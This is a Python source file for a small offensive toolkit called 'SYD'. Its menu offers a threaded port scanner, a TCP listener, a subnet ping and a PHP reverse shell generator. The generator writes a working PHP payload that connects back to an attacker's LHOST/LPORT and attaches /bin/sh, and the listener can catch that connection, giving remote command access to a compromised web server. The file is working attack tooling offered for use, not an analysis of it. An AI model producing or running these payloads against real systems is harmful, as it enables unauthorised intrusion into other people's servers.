from termcolor import colored
import socket
import threading
import time
import subprocess
import re
import os
import platform

def print_syd_logo():
    logo = [
        "░▒▓███████▓▒ ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  ",
        "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ",
        "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ",
        " ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
        "       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ",
        "       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ",
        "░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓███████▓▒░  "
    ]
    for line in logo:
        print(colored(line, 'cyan', attrs=['bold']))
        time.sleep(0.1)

def print_welcome_message():
    print(colored("\nWelcome to SYD - Multi-Purpose Cyber Security Tool Kit", 'green', attrs=['bold']))
    print(colored("Developed by SydRa aka Sacit \n", 'yellow'))

def validate_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if pattern.match(ip):
        return ip
    print(colored("[!] Invalid IP Address! Try Again.", "red"))
    return validate_ip(input(colored("Enter Target IP Address: ", "cyan")))

def validate_port(port):
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
    except ValueError:
        pass
    print(colored("[!] Invalid Port! Try Again.", "red"))
    return validate_port(input(colored("Enter Target Port (1-65535): ", "cyan")))

def scan_port(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    conn = s.connect_ex((ip, port))
    if conn == 0:
        print(colored(f"[+] {ip}:{port} Open", "green"))
    s.close()

def port_scanner(ip):
    print(colored(f"\nScanning... {ip} (1-65535)\n", "yellow"))
    try:
        for port in range(1, 65536):
            thread = threading.Thread(target=scan_port, args=(ip, port))
            thread.start()
    except KeyboardInterrupt:
        print(colored("\nScanning process aborted! Returning to Menu...\n", "red"))
        main_menu()

def port_listener():
    host = "0.0.0.0"
    port = int(input(colored("Which Port You Want To Listen? (1-65536) : ", "cyan")))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)

    print(colored(f"\n[+] Port {port} dinleniyor. Bağlantı bekleniyor...", "yellow"))
    try:
        client_socket, client_address = server.accept()
        print(colored(f"\n[+] Connection Confirmed: {client_address[0]}:{client_address[1]}", "green"))

        while True:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(colored(f"[CLIENT]: {data}", "cyan"))
            message = input(colored("[YOU]: ", "magenta"))
            client_socket.send(message.encode())
    except KeyboardInterrupt:
        print(colored("\n[!] Returning to the Menu...", "red"))
    finally:
        server.close()

def generate_php_reverse_shell():
    lhost = input(colored("Enter Your Attack Ip Address (LHOST): ", "cyan"))
    lport = input(colored("Enter Your Attack Port (LPORT): ", "cyan"))

    try:
        php_shell = f'''<?php
        $sock = fsockopen("{lhost}", {lport});
        $proc = proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
        ?>'''

        base_filename = "reverse_shell.php"
        file_counter = 1

        while os.path.exists(base_filename):
            base_filename = f"reverse_shell_{file_counter}.php"
            file_counter += 1

        with open(base_filename, "w") as file:
            file.write(php_shell)

        print(colored(f"[+] PHP Reverse Shell file created as '{base_filename}' on your Desktop", "green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))
        generate_php_reverse_shell()

def get_local_ip():
    if platform.system() == "Windows":
        ipconfig = subprocess.Popen("ipconfig", stdout=subprocess.PIPE)
        result = ipconfig.communicate()[0].decode(errors='ignore')  # Hata veren karakterleri yoksay
        match = re.search(r"IPv4 Address.*: (\d+\.\d+\.\d+\.\d+)", result)
        if match:
            return match.group(1)
    else:
        ipconfig = subprocess.Popen("ifconfig", stdout=subprocess.PIPE)
        result = ipconfig.communicate()[0].decode(errors='ignore')  # Hata veren karakterleri yoksay
        match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", result)
        if match:
            return match.group(1)
    return None

def discover_network():
    local_ip = get_local_ip()
    if local_ip is None:
        print("Local IP Address Could Not Be Found.")
        return

    print(f"Local IP: {local_ip}")

    subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"

    print(f"Scanning Network: {subnet}")

    if platform.system() == "Windows":
        command = f"ping {subnet} -n 1"
    else:
        command = f"ping -c 1 {subnet}"

    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE)
        print(f"Scan Result: \n{result.decode()}")
    except subprocess.CalledProcessError as e:
        print(f"Error while scanning the network: {e}")

def main_menu():
    while True:
        print(colored("\n[ SYD - Cyber Security Tools ]", "cyan", attrs=["bold"]))
        print(colored("1 - Port Scanner (Basic)", "yellow"))
        print(colored("2 - TCP Port Listener (Basic)", "yellow"))
        print(colored("3 - PHP Reverse Shell Generator (Alpha 0.1)", "yellow"))
        print(colored("4 - Net Discover", "yellow"))
        print(colored("0 - Exit", "red"))

        choice = input(colored("\nSelect a Tool: ", "cyan"))
        if choice == "0":
            print(colored("[!] Quitting from SYD... See'ya.", "red"))
            break
        elif choice == "1":
            target_ip = input(colored("Target IP Address: ", "cyan"))
            port_scanner(target_ip)
        elif choice == "2":
            port_listener()
        elif choice == "3":
            generate_php_reverse_shell()
        elif choice == "4":
            discover_network()
        else:
            print(colored("[!] Invalid selection! Try Again.", "red"))

if __name__ == "__main__":
    print_syd_logo()
    print_welcome_message()
    main_menu()
